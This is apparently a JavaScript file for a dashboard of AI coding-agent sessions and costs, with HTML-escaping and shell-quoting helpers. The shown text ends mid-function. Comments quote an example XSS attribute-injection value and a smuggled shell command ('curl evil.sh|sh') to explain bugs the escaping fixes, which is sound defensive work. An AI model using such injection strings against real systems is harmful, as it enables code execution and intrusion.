// Dashboard rendering and interactions.
// Data is injected by the Go template as window.dashboardData.

// Escapes a value for HTML, in a text node and in a quoted attribute alike.
//
// This used to round-trip through a detached element's innerHTML, which escapes
// & < > and nothing else. Every value that reaches a title= or a data- attribute
// is attacker-influenced — project paths, model names and session titles are all
// read out of agent logs — so leaving " and ' intact let a crafted log close the
// attribute and add its own. A project path of
//
//     /tmp/evil" onmouseover="window.__xss1=1
//
// rendered as `<td class="project-name" title="/tmp/evil" onmouseover="…">`: a
// live event handler, not an escaped string. There is no element injection to
// worry about, since < > are escaped, but a handler is enough — and this page is
// built around hover tooltips, so onmouseover fires on ordinary use.
//
// Both quotes are escaped, plus the backtick, so a value is also inert if it is
// ever interpolated into a JS string or a template literal. This is defined
// before the render IIFEs below because those run at load, and a `const` further
// down the file would be in its temporal dead zone when they call it.
const HTML_ESCAPES = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '`': '&#96;',
};

function escapeHtml(text) {
    return String(text == null ? '' : text).replace(/[&<>"'`]/g, ch => HTML_ESCAPES[ch]);
}

// Dollars with thousands separators, the one format used across the page.
function formatMoney(value, digits = 2) {
    const n = Number(value) || 0;
    return (n < 0 ? '-$' : '$') + Math.abs(n).toLocaleString('en-US', {
        minimumFractionDigits: digits, maximumFractionDigits: digits,
    });
}

const dashboardData = window.dashboardData || {};

// Filtering swaps the data under a live page: app.js replaces the contents of
// dashboardData and then calls every refresher registered here.
const dashdRefreshers = [];

function refillArray(target, values) {
    target.length = 0;
    (values || []).forEach(v => target.push(v));
}

(function() {
    let dailyStats = [];
    let allModels = [];
    function readDaily() {
        dailyStats = dashboardData.dailyStats || [];
        // Collect all model names ordered by total cost (highest first)
        const modelTotals = {};
        dailyStats.forEach(d => {
            Object.entries(d.models).forEach(([m, c]) => {
                modelTotals[m] = (modelTotals[m] || 0) + c;
            });
        });
        allModels = Object.keys(modelTotals).sort(
            (a, b) => modelTotals[b] - modelTotals[a]
        );
    }
    readDaily();
    dashdRefreshers.push(() => { readDaily(); render(); });

    // Distinct colour palette — one colour per model.
    // We cycle through a fixed set so the same model always
    // gets the same colour across page reloads.
    const PALETTE = [
        '#3fb950', // green  (matches accent-green)
        '#58a6ff', // blue
        '#a371f7', // purple
        '#d29922', // yellow
        '#f85149', // red
        '#39d353', // bright green
        '#79c0ff', // light blue
        '#ff7b72', // salmon
        '#ffa657', // orange
        '#56d364', // lime
        '#bc8cff', // lavender
        '#e3b341', // amber
    ];
    function modelColor(model, idx) {
        return PALETTE[idx % PALETTE.length];
    }

    // Only show the last 14 days by default; full history is
    // accessible via a toggle.
    const RECENT_DAYS = 14;
    let showAll = false;
    let rollupMode = 'daily';

    function aggregateSpending(days, mode) {
        if (mode === 'daily') return days;
        const buckets = {};
        const order = [];
        days.forEach(d => {
            let key = d.day.slice(0, 7); // monthly: YYYY-MM
            if (mode === 'weekly') {
                const dt = new Date(d.day + 'T00:00:00');
                const day = dt.getDay();
                const diff = dt.getDate() - day + (day === 0 ? -6 : 1);
                dt.setDate(diff);
                const y = dt.getFullYear();
                const m = String(dt.getMonth() + 1).padStart(2, '0');
                const dd = String(dt.getDate()).padStart(2, '0');
                key = `Wk ${y}-${m}-${dd}`;
            }
            if (!buckets[key]) {
                buckets[key] = { day: key, cost: 0, models: {} };
                order.push(key);
            }
            buckets[key].cost += d.cost;
            Object.entries(d.models || {}).forEach(([m, c]) => {
                buckets[key].models[m] = (buckets[key].models[m] || 0) + c;
            });
        });
        return order.map(k => buckets[k]);
    }

    function getVisibleDays() {
        const series = aggregateSpending(dailyStats, rollupMode);
        return showAll ? series : series.slice(-RECENT_DAYS);
    }

    const rollupTabs = document.getElementById('daily-rollup-tabs');
    if (rollupTabs && rollupTabs.addEventListener) {
        rollupTabs.addEventListener('click', event => {
            const btn = event.target.closest('[data-daily-rollup]');
            if (!btn) return;
            rollupMode = btn.dataset.dailyRollup || 'daily';
            rollupTabs.querySelectorAll('[data-daily-rollup]').forEach(t => {
                const active = t.dataset.dailyRollup === rollupMode;
                t.classList.toggle('is-active', active);
                t.setAttribute('aria-selected', active ? 'true' : 'false');
            });
            render();
        });
    }

    function render() {
        const container = document.getElementById('daily-chart-content');
        const visible = getVisibleDays();
        if (!visible.length) {
            // Blank space is not a message. The chart is the biggest thing on
            // the page, so on a fresh install it is the first thing looked at.
            if (container) {
                container.innerHTML =
                    '<div class="empty-state">' +
                    '<strong>No spending recorded yet.</strong>' +
                    '<span>It appears once the scanner has read a session log. ' +
                    'The sources panel below reports what was looked for.</span>' +
                    '</div>';
            }
            return;
        }

        const maxCost = Math.max(...visible.map(d => d.cost), 0.0001);

        // Group days by YYYY-MM for monthly totals
        const monthTotals = {};
        visible.forEach(d => {
            const month = d.day.slice(0, 7);
            if (!monthTotals[month]) {
                monthTotals[month] = {cost: 0, models: {}};
            }
            monthTotals[month].cost += d.cost;
            Object.entries(d.models).forEach(([m, c]) => {
                monthTotals[month].models[m] =
                    (monthTotals[month].models[m] || 0) + c;
            });
        });

        let html = '';

        // Legend
        if (allModels.length > 0) {
            html += '<div class="daily-legend">';
            allModels.forEach((m, i) => {
                const color = modelColor(m, i);
                const shortName = m.length > 35
                    ? m.slice(0, 32) + '...' : m;
                html += `<span class="legend-item">
                    <span class="legend-dot" style="background:${color}"></span>
                    ${escapeHtml(shortName)}
                </span>`;
            });
            html += '</div>';
        }

        let prevMonth = null;

        visible.forEach(d => {
            const month = d.day.slice(0, 7);

            // Insert monthly total separator when month changes
            // (after we have seen all days of the previous month)
            if (rollupMode === 'daily' && prevMonth && month !== prevMonth) {
                html += renderMonthRow(prevMonth, monthTotals[prevMonth]);
            }
            prevMonth = month;

            // Stacked bar for this day
            let stackedSegments = '';
            allModels.forEach((m, i) => {
                const mCost = d.models[m] || 0;
                const mPct = (mCost / maxCost * 100);
                if (mPct < 0.01) return;
                stackedSegments += `<a class="bar-segment" href="${filterLink('model', m)}" style="width:${mPct.toFixed(2)}%;background:${modelColor(m, i)}" title="${escapeHtml(m)}: ${formatMoney(mCost, 4)}"></a>`;
            });

            html += `
                <div class="daily-bar">
                    <span class="date">${rollupMode === 'daily' ? `<a href="${dayLink(d.day)}" title="Show only this day">${escapeHtml(d.day)}</a>` : escapeHtml(d.day)}</span>
                    <div class="bar-wrapper">
                        <div class="bar-container stacked">
                            ${stackedSegments}
                        </div>
                    </div>
                    <span class="amount">${formatMoney(d.cost)}</span>
                </div>`;
        });

        // Monthly total for the last visible month
        if (rollupMode === 'daily' && prevMonth) {
            html += renderMonthRow(prevMonth, monthTotals[prevMonth]);
        }

        // Toggle button
        const totalDays = aggregateSpending(dailyStats, rollupMode).length;
        if (totalDays > RECENT_DAYS) {
            const label = showAll
                ? `Show last ${RECENT_DAYS}`
                : `Show all ${totalDays} ${{ weekly: 'weeks', monthly: 'months' }[rollupMode] || 'days'}`;
            html += `<div class="daily-toggle-row">
                <button data-toggle-daily-chart class="copy-btn">${label}</button>
            </div>`;
        }

        document.getElementById('daily-chart-content').innerHTML = html;
    }

    function renderMonthRow(month, mt) {
        const [year, mon] = month.split('-');
        const monthNames = [
            'January', 'February', 'March', 'April', 'May', 'June',
            'July', 'August', 'September', 'October', 'November', 'December'
        ];
        const label = `${monthNames[Number(mon) - 1] || mon} ${year}`;
        let segments = '';
        allModels.forEach((m, i) => {
            const mCost = mt.models[m] || 0;
            const mPct = mt.cost > 0 ? (mCost / mt.cost * 100) : 0;
            if (mPct < 0.01) return;
            segments += `<div class="bar-segment" style="width:${mPct.toFixed(2)}%;background:${modelColor(m, i)};opacity:0.55" title="${escapeHtml(m)}: ${formatMoney(mCost, 4)}"></div>`;
        });
        return `
            <div class="monthly-total-row">
                <span class="date monthly-label">${label}</span>
                <div class="bar-wrapper">
                    <div class="bar-container stacked">
                        ${segments}
                    </div>
                </div>
                <span class="amount monthly-amount">${formatMoney(mt.cost)}</span>
            </div>`;
    }

    document.getElementById('daily-chart-content')?.addEventListener('click', event => {
        if (!event.target.closest('[data-toggle-daily-chart]')) return;
        showAll = !showAll;
        render();
    });

    render();
})();

const projects = (dashboardData.projects || []).slice();

// Single-quotes a value for sh.
//
// Every character is inert inside '...', including the double quote that the
// old construction relied on: a double-quoted string ends at the first " in it,
// so a working directory of
//
//	/x" ; curl evil.sh|sh ; "
//
// closed the cd argument and everything after it was a second command. The
// only character that ends a single-quoted string is a single quote itself, and
// the usual way out of that is to end the quote, emit an escaped quote, and
// reopen: '\''. That is the one construction to get right here, so it is the
// only one.
//
// agentCmd is not log-derived — it is the agent id, one of a fixed set the
// scanner assigns per source — but it is quoted like the rest, because a
// command position is exactly the wrong place to trust that.
function shQuote(value) {
    return "'" + String(value == null ? '' : value).replace(/'/g, "'\\''") + "'";
}

// The resume command the Copy button hands over.
//
// This is a command line, so it is quoted for sh rather than escaped for HTML:
// the two are unrelated and the button vouches for the result. Note that HTML
// escaping of the surrounding data- attribute is a second, independent
// requirement — escapeHtml still guards the attribute this ends up in.
function buildResumeCmd(agentCmd, cwd, sessionPath, sessionUid) {
    const cwdArg = shQuote(cwd);
    if (agentCmd === 'claude') {
        return 'cd ' + cwdArg + ' && ' + shQuote('claude') + ' --resume ' + shQuote(sessionUid);
    } else if (agentCmd === 'codex') {
        return 'cd ' + cwdArg + ' && ' + shQuote('codex') + ' --resume ' + shQuote(sessionUid);
    } else if (agentCmd === 'agy') {
        return 'cd ' + cwdArg + ' && ' + shQuote('agy') + ' --conversation ' + shQuote(sessionUid);
    } else if (agentCmd === 'opencode') {
        // OpenCode keeps every session in one database rather than in a
        // transcript file, so there is no path to hand it: it resumes by session
        // id. Passing the path — which is empty for every OpenCode session —
        // produced `opencode --session ''`, a command that names no session.
        return 'cd ' + cwdArg + ' && ' + shQuote('opencode') + ' --session ' + shQuote(sessionUid);
    } else {
        return 'cd ' + cwdArg + ' && ' + shQuote(agentCmd) +
            ' --session ' + shQuote(sessionPath);
    }
}

function formatDuration(seconds) {
    if (seconds < 60) {
        return Math.round(seconds) + 's';
    } else if (seconds < 3600) {
        const mins = Math.floor(seconds / 60);
        const secs = Math.round(seconds % 60);
        return mins + 'm' + secs.toString().padStart(2, '0') + 's';
    } else {
        const hours = Math.floor(seconds / 3600);
        const mins = Math.round((seconds % 3600) / 60);
        return hours + 'h' + mins.toString().padStart(2, '0') + 'm';
    }
}

let projectSort = { field: 'last_activity', asc: false };
let sessionsSort = { field: 'start', asc: false };

// Sessions are paged rather than all rendered: a few hundred sessions means a
// few hundred rows, each with resume commands and expandables, which is a
// multi-megabyte DOM for no benefit until someone scrolls to it.
const SESSIONS_PAGE_SIZE = 50;
let sessionsPage = 0;

// Column counts per table. The header row in the template and the cells each
// renderer emits are asserted against these by the Go test, so the two cannot
// drift apart again.
const SESSIONS_COLUMNS = 10;
const PROVIDERS_COLUMNS = 11;
const MODELS_COLUMNS = 13;
const TOOLS_COLUMNS = 6;
const PROJECTS_COLUMNS = 10;
const ACTIVITY_COLUMNS = 9;

// An empty tbody is indistinguishable from one that failed to render, and on a
// machine whose logs dashd cannot read every table is empty. That reader must
// not conclude there was no usage, so the row says what it means instead.
function emptyRow(columns, message) {
    let reset = '';
    if (typeof window !== 'undefined' && window.filterState) {
        const f = window.filterState;
        const hasFilter = (f.models && f.models.length) ||
            (f.agents && f.agents.length) ||
            (f.projects && f.projects.length) ||
            (f.machines && f.machines.length) ||
            (typeof location !== 'undefined' && /date_|range=(?!all)/.test(location.search));
        if (hasFilter) {
            reset = ' <a href="/?range=all" class="clear-link">Show everything</a>';
        }
    }
    return '<tr><td colspan="' + columns + '" class="empty-row">' +
        escapeHtml(message) + reset + '</td></tr>';
}

function formatFullNumber(value) {
    const n = Number(value) || 0;
    return String(Math.round(n));
}

function trimOneDecimal(value) {
    return value.toFixed(1).replace(/\.0$/, '');
}

function formatCompactNumber(value) {
    const n = Number(value) || 0;
    const sign = n < 0 ? '-' : '';
    const abs = Math.abs(n);
    const units = [
        [1_000_000_000_000, 'T'],
        [1_000_000_000, 'B'],
        [1_000_000, 'M'],
        [1_000, 'k'],
    ];

    for (const [size, suffix] of units) {
        if (abs >= size) {
            return sign + trimOneDecimal(abs / size) + suffix;
        }
    }
    return sign + formatFullNumber(abs);
}

// The current view narrowed to some values of one filter.
function filterLink(key, values) {
    const q = new URLSearchParams((typeof location !== 'undefined' && location.search) || '');
    q.delete(key);
    [].concat(values).forEach(v => q.append(key, v));
    return escapeHtml('/?' + q.toString());
}

// The current view narrowed to one calendar day.
function dayLink(day) {
    const q = new URLSearchParams((typeof location !== 'undefined' && location.search) || '');
    q.delete('range');
    q.set('date_from', day);
    q.set('date_to', day);
    return escapeHtml('/?' + q.toString());
}

function displayNameFromPath(path) {
    const text = String(path || 'unknown').replace(/[\\/]+$/, '');
    const parts = text.split(/[\\/]+/);
    return parts[parts.length - 1] || text || 'unknown';
}

const TOKEN_DETAIL_FIELDS = [
    ['In', 'input_tokens'],
    ['Out', 'output_tokens'],
    ['Cache read', 'cache_read_tokens'],
    ['Cache write', 'cache_write_tokens'],
    ['Reasoning', 'reasoning_tokens'],
];

function tokenValue(item, field) {
    return Number(item?.[field] || 0);
}

function tokenTitle(item) {
    return [
        `Total: ${formatFullNumber(tokenValue(item, 'tokens'))}`,
        ...TOKEN_DETAIL_FIELDS.map(
            ([label, field]) => `${label}: ${formatFullNumber(tokenValue(item, field))}`
        ),
    ].join('\n');
}

function tokenDetailText(item, compact = false) {
    const formatter = compact ? formatCompactNumber : formatFullNumber;
    return TOKEN_DETAIL_FIELDS
        .map(([label, field]) => [label, tokenValue(item, field)])
        .filter(([, value]) => value > 0)
        .map(([label, value]) => `${label} ${formatter(value)}`)
        .join(' · ');
}

function tokenCellHtml(item) {
    return `<span class="token-cell" title="${escapeHtml(tokenTitle(item))}">${formatCompactNumber(tokenValue(item, 'tokens'))}</span>`;
}

// Column sort.
//
// Values are compared numerically whenever both sides parse as numbers, which
// is not a nicety: comparing them as text puts "1000" before "900", and every
// token count past six digits sorts as a string. Ties fall back to the row's
// original position, so equal values keep a stable order rather than shuffling
// between renders.
function compareValues(a, b) {
    const aNum = a !== null && a !== undefined && a !== '' && Number.isFinite(Number(a));
    const bNum = b !== null && b !== undefined && b !== '' && Number.isFinite(Number(b));
    if (aNum && bNum) {
        const na = Number(a);
        const nb = Number(b);
        return na < nb ? -1 : na > nb ? 1 : 0;
    }
    const sa = String(a == null ? '' : a).toLowerCase();
    const sb = String(b == null ? '' : b).toLowerCase();
    if (sa < sb) return -1;
    if (sa > sb) return 1;
    return 0;
}

function sortData(data, sort, accessor) {
    const get = accessor || (row => row[sort.field]);
    return data
        .map((row, idx) => ({row, idx, key: get(row)}))
        .sort((a, b) => {
            const cmp = compareValues(a.key, b.key);
            if (cmp !== 0) return sort.asc ? cmp : -cmp;
            return a.idx - b.idx;
        })
        .map(entry => entry.row);
}

function renderProjects() {
    const tbody = document.getElementById('projects-tbody');
    if (!tbody) return;
    const sorted = sortData(projects, projectSort);
    if (!sorted.length) {
        tbody.innerHTML = emptyRow(PROJECTS_COLUMNS, 'No projects in this view.');
        return;
    }
    tbody.innerHTML = sorted.map((p, idx) => {
        const displayName = displayNameFromPath(p.name);
        const shortName = displayName.length > 50 ? displayName.slice(0, 47) + '...' : displayName;
        const rowId = 'project-' + idx;

        // Build model breakdown HTML
        const modelRows = p.models.map(m => `
            <div class="model-item">
                <span class="model-name">${escapeHtml(m.name)}</span>
                <span class="model-stat" title="${formatFullNumber(m.messages)} msgs">${formatCompactNumber(m.messages)} msgs</span>
                <span class="model-stat token-wide" title="${escapeHtml(tokenTitle(m))}">${formatCompactNumber(m.tokens)} tok</span>
                <span class="model-stat token-detail-wide">${escapeHtml(tokenDetailText(m, true))}</span>
                <span class="model-stat c-blue">${(m.avg_tps || 0).toFixed(1)} tok/s</span>
                <span class="model-stat cost">${formatMoney(m.cost)}</span>
            </div>
        `).join('');

        // Build tool breakdown HTML
        const toolRows = (p.tools || []).map(t => `
            <div class="model-item">
                <span class="model-name c-yellow">${escapeHtml(t.name)}</span>
                <span class="model-stat" title="${formatFullNumber(t.calls)} calls">${formatCompactNumber(t.calls)} calls</span>
                <span class="model-stat c-yellow">${t.time_display}</span>
                <span class="model-stat">avg ${t.avg_time_display}</span>
                ${t.errors > 0 ? `<span class="model-stat c-red">${t.errors} errors</span>` : ''}
            </div>
        `).join('');

        return `
            <tr class="expandable-row" data-toggle-project="${rowId}" tabindex="0" aria-expanded="false">
                <td class="project-name" title="${escapeHtml(p.name)}"><span class="expand-icon">▶</span> ${escapeHtml(shortName)}</td>
                <td class="numeric">${p.sessions}</td>
                <td class="numeric" title="${formatFullNumber(p.messages)}">${formatCompactNumber(p.messages)}</td>
                <td class="tokens numeric">${tokenCellHtml(p)}</td>
                <td class="c-purple numeric">${p.llm_time_display}</td>
                <td class="c-yellow numeric">${p.tool_time_display}</td>
                <td class="c-blue numeric">${(p.avg_tps || 0).toFixed(1)}</td>
                <td class="cost numeric">${formatMoney(p.cost)}</td>
                <td class="numeric" title="average cost per session">${formatMoney(Number(p.per_session || 0))}</td>
                <td class="c-muted">${p.last_activity_display}</td>
            </tr>
            <tr class="model-breakdown" id="${rowId}">
                <td colspan="${PROJECTS_COLUMNS}">
                    <div class="model-tree">
                        <div class="detail-line"><strong>Path:</strong> ${escapeHtml(p.name)}
                            · <a href="/?project=${encodeURIComponent(p.name)}&view=sessions">Sessions in this project &rarr;</a></div>
                        <div class="detail-line" title="${escapeHtml(tokenTitle(p))}"><strong>Tokens:</strong> ${formatCompactNumber(p.tokens)} ${tokenDetailText(p, true) ? `(${escapeHtml(tokenDetailText(p, true))})` : ''}</div>
                        <div class="detail-heading">Models:</div>
                        ${modelRows || '<div class="c-muted">No model data</div>'}
                        ${toolRows ? `<div class="detail-heading detail-heading-spaced">Tools:</div>${toolRows}` : ''}
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

function toggleProjectRow(rowId, trigger) {
    const row = document.getElementById(rowId);
    const parentRow = trigger || document.querySelector('[data-toggle-project="' + rowId + '"]');
    row.classList.toggle('show');
    parentRow.classList.toggle('expanded');
    // The disclosure is announced by aria-expanded, so a keyboard user hears
    // the state change rather than only seeing the row open.
    const nowExpanded = parentRow.classList.contains('expanded');
    parentRow.setAttribute('aria-expanded', nowExpanded ? 'true' : 'false');
}

// Sessions are paged, sorted and searched on the server (/api/sessions), so the
// page never carries the whole session list and there is no hidden cap. The
// table header's data-sort names map onto the server's sort keys here.
const SESSION_SORT_KEYS = {
    project: 'project', start: 'first', duration: 'wall', llm_time: 'llm',
    tool_time: 'tool', avg_tps: 'tps', messages: 'calls', tokens: 'tokens',
    cost: 'cost', errors: 'errors',
};
let sessionsRows = [];
let sessionsTotal = 0;
let sessionsRequest = 0;

// The page's own filter (everything in the query string that the server's
// filter understands), so the table always agrees with the rest of the page.
function currentFilterParams() {
    const src = new URLSearchParams((typeof location !== 'undefined' && location.search) || '');
    const out = new URLSearchParams();
    ['model', 'agent', 'project', 'machine', 'tag', 'unpriced', 'range', 'date_from', 'date_to'].forEach(k => {
        src.getAll(k).forEach(v => out.append(k, v));
    });
    return out;
}

function sessionsQueryString() {
    const params = currentFilterParams();
    const search = document.getElementById('sessions-search');
    const q = (search && search.value || '').trim();
    if (q) params.set('q', q);
    params.set('sort', SESSION_SORT_KEYS[sessionsSort.field] || 'last');
    if (sessionsSort.asc) params.set('asc', '1');
    params.set('limit', String(SESSIONS_PAGE_SIZE));
    params.set('offset', String(sessionsPage * SESSIONS_PAGE_SIZE));
    return params.toString();
}

async function loadSessions() {
    const tbody = document.getElementById('sessions-tbody');
    if (!tbody || typeof fetch !== 'function') return;
    if (sessionsGrouped) {
        sessionsRequest++;
        renderSessionGroups();
        return;
    }
    const id = ++sessionsRequest;
    try {
        const resp = await fetch('/api/sessions?' + sessionsQueryString(), {
            headers: { Accept: 'application/json' },
        });
        if (!resp.ok) throw new Error('status ' + resp.status);
        const data = await resp.json();
        // A slower, older response must not overwrite a newer one.
        if (id !== sessionsRequest) return;
        sessionsRows = data.sessions || [];
        sessionsTotal = data.total || 0;
    } catch (err) {
        if (id !== sessionsRequest) return;
        sessionsRows = [];
        sessionsTotal = 0;
        tbody.innerHTML = emptyRow(SESSIONS_COLUMNS, 'Could not load sessions. Try Refresh.');
        if (typeof window !== 'undefined' && typeof window.showDashdToast === 'function') {
            window.showDashdToast('Could not load sessions');
        }
        return;
    }
    renderSessions();
}

// Agents record no working directory for some sessions.
function projectLabel(path) {
    if (!path || path === 'unknown') return '(no project)';
    const name = displayNameFromPath(path);
    return name.length > 40 ? name.slice(0, 37) + '...' : name;
}

function sessionRowHtml(s) {
    const sessionUrl = '/session?uid=' + encodeURIComponent(s.uid);
    const resumePath = String(s.path || '').replace(/\\/g, '/');
    const resumeCmd = buildResumeCmd(s.agent_cmd, s.cwd, resumePath, s.resume_uid || s.uid);
    const project = projectLabel(s.cwd);
    const badge = (text, title) => text ? `<span class="badge" title="${title}">${escapeHtml(text)}</span>` : '';
    const models = s.models || [];
    return `
        <tr>
            <td class="project-name" title="${escapeHtml(s.cwd)}">
                <a class="session-name" href="${sessionUrl}">${escapeHtml(s.title || project)}</a>
                <div class="session-meta">${s.title ? escapeHtml(project) : ''}
                    ${badge(s.agent_cmd, 'Program')}${badge(models[0], escapeHtml(models.join(', ')))}${models.length > 1 ? badge('+' + (models.length - 1), escapeHtml(models.join(', '))) : ''}${badge(s.machine, 'Machine')}</div>
            </td>
            <td class="c-muted">${s.start_display}</td>
            <td class="c-muted numeric">${s.duration_display}</td>
            <td class="c-purple numeric">${s.llm_time_display}</td>
            <td class="c-yellow numeric">${s.tool_time_display || '0s'}</td>
            <td class="c-blue numeric">${(s.avg_tps || 0).toFixed(1)}</td>
            <td class="numeric" title="${formatFullNumber(s.messages)}">${formatCompactNumber(s.messages)}</td>
            <td class="tokens numeric">${tokenCellHtml(s)}</td>
            <td class="cost numeric">${formatMoney(s.cost)}</td>
            <td>
                <button data-copy-resume data-resume-cmd="${escapeHtml(resumeCmd)}" class="icon-btn" title="Copy resume command">Copy</button>
                ${s.orphaned
                ? '<span class="model-stat" title="This session\'s log is no longer on disk; its figures are kept">Log gone</span>'
                : ''}
                <a href="${sessionUrl}" class="session-link" title="View the stored calls">Open →</a>
            </td>
        </tr>
    `;
}

// Grouped view: one row per project, whose sessions load when it is opened. The
// project totals come from the page payload, so they cover every session and
// not just one page of them.
let sessionsGrouped = false;

function renderSessionGroups() {
    const tbody = document.getElementById('sessions-tbody');
    const query = (document.getElementById('sessions-search')?.value || '').trim().toLowerCase();
    const rows = projects.filter(p => !query || String(p.name).toLowerCase().includes(query))
        .sort((a, b) => b.last_activity - a.last_activity);
    const shownEl = document.getElementById('sessions-shown');
    if (shownEl) shownEl.textContent = rows.length + ' projects';
    ['sessions-prev', 'sessions-next'].forEach(id => {
        const btn = document.getElementById(id);
        if (btn) btn.disabled = true;
    });
    tbody.innerHTML = rows.length ? rows.map(p => `
        <tr class="expandable-row" data-group-project="${escapeHtml(p.name)}" tabindex="0" aria-expanded="false">
            <td class="project-name" title="${escapeHtml(p.name)}"><span class="expand-icon">▶</span> ${escapeHtml(projectLabel(p.name))} <span class="badge">${formatFullNumber(p.sessions)} sessions</span></td>
            <td class="c-muted">${p.last_activity_display}</td>
            <td></td>
            <td class="c-purple numeric">${p.llm_time_display}</td>
            <td class="c-yellow numeric">${p.tool_time_display}</td>
            <td class="c-blue numeric">${(p.avg_tps || 0).toFixed(1)}</td>
            <td class="numeric">${formatCompactNumber(p.messages)}</td>
            <td class="tokens numeric">${tokenCellHtml(p)}</td>
            <td class="cost numeric">${formatMoney(p.cost)}</td>
            <td></td>
        </tr>`).join('') : emptyRow(SESSIONS_COLUMNS, 'No projects in this view.');
}

async function toggleSessionGroup(row) {
    const open = row.getAttribute('aria-expanded') === 'true';
    row.setAttribute('aria-expanded', open ? 'false' : 'true');
    row.classList.toggle('expanded', !open);
    if (open) {
        while (row.nextElementSibling && !row.nextElementSibling.dataset.groupProject) row.nextElementSibling.remove();
        return;
    }
    const params = currentFilterParams();
    params.delete('project');
    params.append('project', row.dataset.groupProject);
    params.set('sort', 'last');
    params.set('limit', '200');
    try {
        const resp = await fetch('/api/sessions?' + params.toString(), { headers: { Accept: 'application/json' } });
        if (!resp.ok) throw new Error('status ' + resp.status);
        const data = await resp.json();
        if (row.getAttribute('aria-expanded') !== 'true') return;
        const more = data.total > data.sessions.length
            ? `<tr><td colspan="${SESSIONS_COLUMNS}" class="empty-row">Showing the newest ${data.sessions.length} of ${data.total}. <a href="${filterLink('project', row.dataset.groupProject)}">Show only this project</a></td></tr>` : '';
        row.insertAdjacentHTML('afterend', data.sessions.map(sessionRowHtml).join('') + more);
    } catch (_) {
        row.setAttribute('aria-expanded', 'false');
        if (typeof window.showDashdToast === 'function') window.showDashdToast('Could not load sessions');
    }
}

function renderSessions() {
    const tbody = document.getElementById('sessions-tbody');
    if (!tbody) return;

    const searchInput = document.getElementById('sessions-search');
    const shownEl = document.getElementById('sessions-shown');
    const countEl = document.getElementById('sessions-count');
    const prevBtn = document.getElementById('sessions-prev');
    const nextBtn = document.getElementById('sessions-next');
    const query = (searchInput?.value || '').trim();

    const totalPages = Math.max(1, Math.ceil(sessionsTotal / SESSIONS_PAGE_SIZE));
    if (countEl) countEl.textContent = sessionsTotal + ' sessions';
    if (shownEl) {
        const from = sessionsTotal ? sessionsPage * SESSIONS_PAGE_SIZE + 1 : 0;
        const to = Math.min(sessionsTotal, (sessionsPage + 1) * SESSIONS_PAGE_SIZE);
        shownEl.textContent = (query ? `${sessionsTotal} match “${query}” · ` : '') +
            `${from}–${to} of ${sessionsTotal} · page ${sessionsPage + 1} of ${totalPages}`;
    }
    if (prevBtn) prevBtn.disabled = sessionsPage === 0;
    if (nextBtn) nextBtn.disabled = sessionsPage >= totalPages - 1;

    if (!sessionsRows.length) {
        tbody.innerHTML = emptyRow(SESSIONS_COLUMNS, query
            ? 'No sessions match this filter.'
            : 'No sessions in this view.');
        return;
    }

    tbody.innerHTML = sessionsRows.map(sessionRowHtml).join('');
}

// The button is passed in rather than taken from the event: the delegate below
// already resolves it, and event.target can be a text node inside the label.
function copyResumeCommand(btn) {
    const cmd = btn.dataset.resumeCmd || '';

    function showSuccess() {
        const originalText = btn.textContent;
        btn.textContent = '✓';
        btn.classList.add('is-copied');
        if (typeof window !== 'undefined' && typeof window.showDashdToast === 'function') {
            window.showDashdToast('Copied resume command to clipboard');
        }
        setTimeout(() => {
            btn.textContent = originalText;
            btn.classList.remove('is-copied');
        }, 1500);
    }

    function showError() {
        if (typeof window !== 'undefined' && typeof window.showDashdToast === 'function') {
            window.showDashdToast('Could not copy to clipboard');
        }
    }

    // Use clipboard API if available (HTTPS or localhost)
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(cmd).then(showSuccess).catch(err => {
            console.error('Failed to copy:', err);
            showError();
        });
    } else {
        // Fallback for HTTP contexts
        const textArea = document.createElement('textarea');
        textArea.value = cmd;
        textArea.style.position = 'fixed';
        textArea.style.left = '-9999px';
        textArea.setAttribute('readonly', '');
        document.body.appendChild(textArea);
        textArea.select();
        try {
            document.execCommand('copy');
            showSuccess();
        } catch (err) {
            console.error('Fallback copy failed:', err);
            showError();
        }
        document.body.removeChild(textArea);
    }
}

function setupSessionsToolbar() {
    const search = document.getElementById('sessions-search');
    const prev = document.getElementById('sessions-prev');
    const next = document.getElementById('sessions-next');
    if (!search && !prev && !next) return; // Section not rendered

    // Debounced because every change is a request.
    if (search) {
        let timer = null;
        search.addEventListener('input', () => {
            clearTimeout(timer);
            timer = setTimeout(() => {
                sessionsPage = 0;
                loadSessions();
            }, 200);
        });
    }
    const group = document.getElementById('sessions-group');
    group?.addEventListener('click', () => {
        sessionsGrouped = !sessionsGrouped;
        group.setAttribute('aria-pressed', sessionsGrouped ? 'true' : 'false');
        group.textContent = sessionsGrouped ? 'Ungroup' : 'Group by project';
        loadSessions();
    });
    prev?.addEventListener('click', () => {
        if (sessionsPage > 0) {
            sessionsPage -= 1;
            loadSessions();
        }
    });
    next?.addEventListener('click', () => {
        sessionsPage += 1;
        loadSessions();
    });
}

// Every clickable cell is wired by delegation from a data- attribute rather than
// by an inline onclick. Two reasons, one of them security: an inline handler is
// a script block that a Content-Security-Policy can only allow with
// 'unsafe-inline', which would also allow a handler an injected attribute
// managed to add; and it puts a value inside a JS string inside an HTML
// attribute, which is a quoting problem waiting for the first value with a
// quote in it. The id passed to the handlers is generated here rather than read
// from a log, but the data- attribute costs nothing and keeps that true.
function setupDelegatedActions() {
    document.addEventListener('click', event => {
        const btn = event.target.closest('[data-copy-resume]');
        if (btn) {
            copyResumeCommand(btn);
            return;
        }
        if (event.target.closest('[data-reload]')) {
            location.reload();
            return;
        }
        const groupRow = event.target.closest('[data-group-project]');
        if (groupRow) {
            toggleSessionGroup(groupRow);
            return;
        }
        const row = event.target.closest('[data-toggle-project]');
        if (row) {
            toggleProjectRow(row.dataset.toggleProject, row);
        }
    });
    // The project disclosure is a click target that a keyboard must also be
    // able to operate. Enter and Space both activate it; Space must not scroll.
    document.addEventListener('keydown', event => {
        if (event.key !== 'Enter' && event.key !== ' ') return;
        const groupRow = event.target.closest('[data-group-project]');
        if (groupRow) {
            event.preventDefault();
            toggleSessionGroup(groupRow);
            return;
        }
        const row = event.target.closest('[data-toggle-project]');
        if (!row) return;
        event.preventDefault();
        toggleProjectRow(row.dataset.toggleProject, row);
    });
}

// Columns that read as ascending-first: names and dates. Everything else is a
// magnitude, where the useful first click is "largest first".
const ASCENDING_FIRST = new Set(['name', 'project', 'start']);

function setupSorting(tableId, sortState, renderFn) {
